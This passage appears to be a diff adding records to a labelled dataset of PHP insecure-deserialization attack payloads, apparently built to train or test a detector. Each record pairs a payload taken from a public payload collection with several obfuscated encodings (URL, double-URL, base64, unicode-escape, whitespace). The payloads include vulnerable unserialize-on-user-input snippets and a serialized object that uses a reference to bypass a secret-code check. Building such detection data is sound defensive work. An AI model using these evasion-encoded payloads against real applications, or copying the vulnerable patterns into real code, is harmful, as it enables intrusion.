+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4320605939f9b432f9f428f054d962b0c8444d82d52ba2e8804aeb733f9a6e95",
+    "original_id": "raw_deser_00010",
+    "original_payload": "<?php\n$data = unserialize($_COOKIE['auth']);\n\nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin = false;\n}",
+    "obfuscated_payload": "%3C%3Fphp%0A%24data%20%3D%20unserialize%28%24_COOKIE%5B%27auth%27%5D%29%3B%0A%0Aif%20%28%24data%5B%27username%27%5D%20%3D%3D%20%24adminName%20%26%26%20%24data%5B%27password%27%5D%20%3D%3D%20%24adminPassword%29%20%7B%0A%20%20%20%20%24admin%20%3D%20true%3B%0A%7D%20else%20%7B%0A%20%20%20%20%24admin%20%3D%20false%3B%0A%7D",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48662572,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00010__obf02",
+    "payload": "PD9waHAKJGRhdGEgPSB1bnNlcmlhbGl6ZSgkX0NPT0tJRVsnYXV0aCddKTsKCmlmICgkZGF0YVsndXNlcm5hbWUnXSA9PSAkYWRtaW5OYW1lICYmICRkYXRhWydwYXNzd29yZCddID09ICRhZG1pblBhc3N3b3JkKSB7CiAgICAkYWRtaW4gPSB0cnVlOwp9IGVsc2UgewogICAgJGFkbWluID0gZmFsc2U7Cn0",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4320605939f9b432f9f428f054d962b0c8444d82d52ba2e8804aeb733f9a6e95",
+    "original_id": "raw_deser_00010",
+    "original_payload": "<?php\n$data = unserialize($_COOKIE['auth']);\n\nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin = false;\n}",
+    "obfuscated_payload": "PD9waHAKJGRhdGEgPSB1bnNlcmlhbGl6ZSgkX0NPT0tJRVsnYXV0aCddKTsKCmlmICgkZGF0YVsndXNlcm5hbWUnXSA9PSAkYWRtaW5OYW1lICYmICRkYXRhWydwYXNzd29yZCddID09ICRhZG1pblBhc3N3b3JkKSB7CiAgICAkYWRtaW4gPSB0cnVlOwp9IGVsc2UgewogICAgJGFkbWluID0gZmFsc2U7Cn0",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 48663581,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00010__obf03",
+    "payload": "\\u003c?php\n$data \\u003d unserialize\\u0028$_COOKIE\\u005b'auth\\u0027])\\u003b\n\nif \\u0028$data\\u005b'username\\u0027] \\u003d= \\u0024adminName \\u0026& \\u0024data\\u005b\\u0027password\\u0027\\u005d =\\u003d $adminPassword) {\n    \\u0024admin \\u003d true;\n} else \\u007b\n    $admin = false;\n}",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4320605939f9b432f9f428f054d962b0c8444d82d52ba2e8804aeb733f9a6e95",
+    "original_id": "raw_deser_00010",
+    "original_payload": "<?php\n$data = unserialize($_COOKIE['auth']);\n\nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin = false;\n}",
+    "obfuscated_payload": "\\u003c?php\n$data \\u003d unserialize\\u0028$_COOKIE\\u005b'auth\\u0027])\\u003b\n\nif \\u0028$data\\u005b'username\\u0027] \\u003d= \\u0024adminName \\u0026& \\u0024data\\u005b\\u0027password\\u0027\\u005d =\\u003d $adminPassword) {\n    \\u0024admin \\u003d true;\n} else \\u007b\n    $admin = false;\n}",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 48664590,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00010__obf04",
+    "payload": "PD9waHAKJGRhdGEgPSB1bnNlcmlhbGl6ZSgkX0NPT0tJRVsnYXV0aCddKTsKCmlmICgkZGF0YVsndXNlcm5hbWUnXSA9PSAkYWRtaW5OYW1lICYmICRkYXRhWydwYXNzd29yZCddID09ICRhZG1pblBhc3N3b3JkKSB7CiAgICAkYWRtaW4gPSB0cnVlOwp9IGVsc2UgewogICAgJGFkbWluID0gZmFsc2U7Cn0=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00010",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4320605939f9b432f9f428f054d962b0c8444d82d52ba2e8804aeb733f9a6e95",
+    "original_id": "raw_deser_00010",
+    "original_payload": "<?php\n$data = unserialize($_COOKIE['auth']);\n\nif ($data['username'] == $adminName && $data['password'] == $adminPassword) {\n    $admin = true;\n} else {\n    $admin = false;\n}",
+    "obfuscated_payload": "PD9waHAKJGRhdGEgPSB1bnNlcmlhbGl6ZSgkX0NPT0tJRVsnYXV0aCddKTsKCmlmICgkZGF0YVsndXNlcm5hbWUnXSA9PSAkYWRtaW5OYW1lICYmICRkYXRhWydwYXNzd29yZCddID09ICRhZG1pblBhc3N3b3JkKSB7CiAgICAkYWRtaW4gPSB0cnVlOwp9IGVsc2UgewogICAgJGFkbWluID0gZmFsc2U7Cn0=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 48665599,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00011__obf01",
+    "payload": "$data = unserialize($%5FC%4FOKIE['auth']);",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c1932e98862ec98d52c8111d379add66dec0df11a7c9eb5f54c3d0e86101c498",
+    "original_id": "raw_deser_00011",
+    "original_payload": "$data = unserialize($_COOKIE['auth']);",
+    "obfuscated_payload": "$data = unserialize($%5FC%4FOKIE['auth']);",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48762575,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00011__obf02",
+    "payload": "JGRhdGEgPSB1bnNlcmlhbGl6ZSgkX0NPT0tJRVsnYXV0aCddKTs=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c1932e98862ec98d52c8111d379add66dec0df11a7c9eb5f54c3d0e86101c498",
+    "original_id": "raw_deser_00011",
+    "original_payload": "$data = unserialize($_COOKIE['auth']);",
+    "obfuscated_payload": "JGRhdGEgPSB1bnNlcmlhbGl6ZSgkX0NPT0tJRVsnYXV0aCddKTs=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 48763584,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00011__obf03",
+    "payload": "$data+=+unserialize($_COOKIE['auth']);",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c1932e98862ec98d52c8111d379add66dec0df11a7c9eb5f54c3d0e86101c498",
+    "original_id": "raw_deser_00011",
+    "original_payload": "$data = unserialize($_COOKIE['auth']);",
+    "obfuscated_payload": "$data+=+unserialize($_COOKIE['auth']);",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 48764593,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00011__obf04",
+    "payload": "\\u0024data%20=%20unserialize%28%5Cu0024_COOKIE%5B%27auth\\u0027%5Cu005d)\\u003b",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00011",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c1932e98862ec98d52c8111d379add66dec0df11a7c9eb5f54c3d0e86101c498",
+    "original_id": "raw_deser_00011",
+    "original_payload": "$data = unserialize($_COOKIE['auth']);",
+    "obfuscated_payload": "\\u0024data%20=%20unserialize%28%5Cu0024_COOKIE%5B%27auth\\u0027%5Cu005d)\\u003b",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "url_decode"
+    ],
+    "generation_seed": 48765602,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00012__obf01",
+    "payload": "%253C%253Fphp%250Aclass%2520ObjectExample%250A%257B%250A%2520%2520var%2520%2524guess%253B%250A%2520%2520var%2520%2524secretCode%253B%250A%257D%250A%250A%2524obj%2520%253D%2520unserialize%2528%2524_GET%255B%2527input%2527%255D%2529%253B%250A%250Aif%2528%2524obj%2529%2520%257B%250A%2520%2520%2520%2520%2524obj-%253EsecretCode%2520%253D%2520rand%2528500000%252C999999%2529%253B%250A%2520%2520%2520%2520if%2528%2524obj-%253Eguess%2520%253D%253D%253D%2520%2524obj-%253EsecretCode%2529%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520echo%2520%2522Win%2522%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%253F%253E",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4472128bb32c62380557ba070b6e6388c9add9508e6f6c795fe9a691bb153d1a",
+    "original_id": "raw_deser_00012",
+    "original_payload": "<?php\nclass ObjectExample\n{\n  var $guess;\n  var $secretCode;\n}\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>",
+    "obfuscated_payload": "%253C%253Fphp%250Aclass%2520ObjectExample%250A%257B%250A%2520%2520var%2520%2524guess%253B%250A%2520%2520var%2520%2524secretCode%253B%250A%257D%250A%250A%2524obj%2520%253D%2520unserialize%2528%2524_GET%255B%2527input%2527%255D%2529%253B%250A%250Aif%2528%2524obj%2529%2520%257B%250A%2520%2520%2520%2520%2524obj-%253EsecretCode%2520%253D%2520rand%2528500000%252C999999%2529%253B%250A%2520%2520%2520%2520if%2528%2524obj-%253Eguess%2520%253D%253D%253D%2520%2524obj-%253EsecretCode%2529%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520echo%2520%2522Win%2522%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%253F%253E",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 48862578,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00012__obf02",
+    "payload": "PD9waHAKY2xhc3MgT2JqZWN0RXhhbXBsZQp7CiAgdmFyICRndWVzczsKICB2YXIgJHNlY3JldENvZGU7Cn0KCiRvYmogPSB1bnNlcmlhbGl6ZSgkX0dFVFsnaW5wdXQnXSk7CgppZigkb2JqKSB7CiAgICAkb2JqLT5zZWNyZXRDb2RlID0gcmFuZCg1MDAwMDAsOTk5OTk5KTsKICAgIGlmKCRvYmotPmd1ZXNzID09PSAkb2JqLT5zZWNyZXRDb2RlKSB7CiAgICAgICAgZWNobyAiV2luIjsKICAgIH0KfQo_Pg==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4472128bb32c62380557ba070b6e6388c9add9508e6f6c795fe9a691bb153d1a",
+    "original_id": "raw_deser_00012",
+    "original_payload": "<?php\nclass ObjectExample\n{\n  var $guess;\n  var $secretCode;\n}\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>",
+    "obfuscated_payload": "PD9waHAKY2xhc3MgT2JqZWN0RXhhbXBsZQp7CiAgdmFyICRndWVzczsKICB2YXIgJHNlY3JldENvZGU7Cn0KCiRvYmogPSB1bnNlcmlhbGl6ZSgkX0dFVFsnaW5wdXQnXSk7CgppZigkb2JqKSB7CiAgICAkb2JqLT5zZWNyZXRDb2RlID0gcmFuZCg1MDAwMDAsOTk5OTk5KTsKICAgIGlmKCRvYmotPmd1ZXNzID09PSAkb2JqLT5zZWNyZXRDb2RlKSB7CiAgICAgICAgZWNobyAiV2luIjsKICAgIH0KfQo_Pg==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 48863587,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00012__obf03",
+    "payload": "<?php\nclass+ObjectExample\n{\n+var%0A$guess;\n%0Avar+$secretCode;\n}\n\n$obj%09=%0Aunserialize($_GET['input']);\n\nif($obj)+{\n%0A$obj->secretCode%0A=+rand(500000,999999);\n+if($obj->guess%0A===%0A$obj->secretCode)%0A{\n%09echo%0A\"Win\";\n%09}\n}\n?>",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4472128bb32c62380557ba070b6e6388c9add9508e6f6c795fe9a691bb153d1a",
+    "original_id": "raw_deser_00012",
+    "original_payload": "<?php\nclass ObjectExample\n{\n  var $guess;\n  var $secretCode;\n}\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>",
+    "obfuscated_payload": "<?php\nclass+ObjectExample\n{\n+var%0A$guess;\n%0Avar+$secretCode;\n}\n\n$obj%09=%0Aunserialize($_GET['input']);\n\nif($obj)+{\n%0A$obj->secretCode%0A=+rand(500000,999999);\n+if($obj->guess%0A===%0A$obj->secretCode)%0A{\n%09echo%0A\"Win\";\n%09}\n}\n?>",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 48864596,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00012__obf04",
+    "payload": "%3C%3Fphp%0Aclass%20ObjectExample%0A%7B%0A%20%20var%20%24guess%3B%0A%20%20var%20%24secretCode%3B%0A%7D%0A%0A%24obj%20%3D%20unserialize%28%24_GET%5B%27input%27%5D%29%3B%0A%0Aif%28%24obj%29%20%7B%0A%20%20%20%20%24obj-%3EsecretCode%20%3D%20rand%28500000%2C999999%29%3B%0A%20%20%20%20if%28%24obj-%3Eguess%20%3D%3D%3D%20%24obj-%3EsecretCode%29%20%7B%0A%20%20%20%20%20%20%20%20echo%20%22Win%22%3B%0A%20%20%20%20%7D%0A%7D%0A%3F%3E",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00012",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "4472128bb32c62380557ba070b6e6388c9add9508e6f6c795fe9a691bb153d1a",
+    "original_id": "raw_deser_00012",
+    "original_payload": "<?php\nclass ObjectExample\n{\n  var $guess;\n  var $secretCode;\n}\n\n$obj = unserialize($_GET['input']);\n\nif($obj) {\n    $obj->secretCode = rand(500000,999999);\n    if($obj->guess === $obj->secretCode) {\n        echo \"Win\";\n    }\n}\n?>",
+    "obfuscated_payload": "%3C%3Fphp%0Aclass%20ObjectExample%0A%7B%0A%20%20var%20%24guess%3B%0A%20%20var%20%24secretCode%3B%0A%7D%0A%0A%24obj%20%3D%20unserialize%28%24_GET%5B%27input%27%5D%29%3B%0A%0Aif%28%24obj%29%20%7B%0A%20%20%20%20%24obj-%3EsecretCode%20%3D%20rand%28500000%2C999999%29%3B%0A%20%20%20%20if%28%24obj-%3Eguess%20%3D%3D%3D%20%24obj-%3EsecretCode%29%20%7B%0A%20%20%20%20%20%20%20%20echo%20%22Win%22%3B%0A%20%20%20%20%7D%0A%7D%0A%3F%3E",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 48865605,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00013__obf01",
+    "payload": "%2524obj%2520%253D%2520unserialize%2528%2524_GET%255B%2527input%2527%255D%2529%253B",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "38962f7f41094d213e52832fda8f62f4d67b5a20768090f271c6108b98fef5c3",
+    "original_id": "raw_deser_00013",
+    "original_payload": "$obj = unserialize($_GET['input']);",
+    "obfuscated_payload": "%2524obj%2520%253D%2520unserialize%2528%2524_GET%255B%2527input%2527%255D%2529%253B",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 48962581,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00013__obf02",
+    "payload": "JG9iaiA9IHVuc2VyaWFsaXplKCRfR0VUWydpbnB1dCddKTs",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "38962f7f41094d213e52832fda8f62f4d67b5a20768090f271c6108b98fef5c3",
+    "original_id": "raw_deser_00013",
+    "original_payload": "$obj = unserialize($_GET['input']);",
+    "obfuscated_payload": "JG9iaiA9IHVuc2VyaWFsaXplKCRfR0VUWydpbnB1dCddKTs",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 48963590,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00013__obf03",
+    "payload": "$obj%0A=+unserialize($_GET['input']);",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "38962f7f41094d213e52832fda8f62f4d67b5a20768090f271c6108b98fef5c3",
+    "original_id": "raw_deser_00013",
+    "original_payload": "$obj = unserialize($_GET['input']);",
+    "obfuscated_payload": "$obj%0A=+unserialize($_GET['input']);",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 48964599,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00013__obf04",
+    "payload": "$obj \\%750%30%33d un%73eriali%7Ae\\u0028\\u00%324_G%45T\\u%3005b\\%750027input\\u0027]);",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00013",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "38962f7f41094d213e52832fda8f62f4d67b5a20768090f271c6108b98fef5c3",
+    "original_id": "raw_deser_00013",
+    "original_payload": "$obj = unserialize($_GET['input']);",
+    "obfuscated_payload": "$obj \\%750%30%33d un%73eriali%7Ae\\u0028\\u00%324_G%45T\\u%3005b\\%750027input\\u0027]);",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "url_decode"
+    ],
+    "generation_seed": 48965608,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00014__obf01",
+    "payload": "O:13:\"ObjectExample\":2:{s:%31%30:\"secretCod%65\";N;s:5:\"%67ue%73s\";R:2;}",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c25b787a9b9505059ef08f80a18faded6ff5e344fc1208cb5f19829b6380cf74",
+    "original_id": "raw_deser_00014",
+    "original_payload": "O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}",
+    "obfuscated_payload": "O:13:\"ObjectExample\":2:{s:%31%30:\"secretCod%65\";N;s:5:\"%67ue%73s\";R:2;}",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49062584,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00014__obf02",
+    "payload": "TzoxMzoiT2JqZWN0RXhhbXBsZSI6Mjp7czoxMDoic2VjcmV0Q29kZSI7TjtzOjU6Imd1ZXNzIjtSOjI7fQ==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c25b787a9b9505059ef08f80a18faded6ff5e344fc1208cb5f19829b6380cf74",
+    "original_id": "raw_deser_00014",
+    "original_payload": "O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}",
+    "obfuscated_payload": "TzoxMzoiT2JqZWN0RXhhbXBsZSI6Mjp7czoxMDoic2VjcmV0Q29kZSI7TjtzOjU6Imd1ZXNzIjtSOjI7fQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 49063593,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00014__obf03",
+    "payload": "O\\u003a13\\u003a\"ObjectExample\\u0022\\u003a2\\u003a\\u007bs\\u003a10\\u003a\\u0022secretCode\"\\u003bN;s:5\\u003a\"guess\"\\u003bR:2;\\u007d",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00014",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/PHP.md",
+    "source_path": "Insecure Deserialization/PHP.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c25b787a9b9505059ef08f80a18faded6ff5e344fc1208cb5f19829b6380cf74",
+    "original_id": "raw_deser_00014",
+    "original_payload": "O:13:\"ObjectExample\":2:{s:10:\"secretCode\";N;s:5:\"guess\";R:2;}",
+    "obfuscated_payload": "O\\u003a13\\u003a\"ObjectExample\\u0022\\u003a2\\u003a\\u007bs\\u003a10\\u003a\\u0022secretCode\"\\u003bN;s:5\\u003a\"guess\"\\u003bR:2;\\u007d",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 49064602,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00014__obf04",
+    "payload": "TzoxMzoiT2JqZWN0RXhhbXBsZSI6Mjp7czoxMDoic2VjcmV0Q29kZSI7TjtzOjU6Imd1ZXNzIjtSOjI7fQ",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00014",
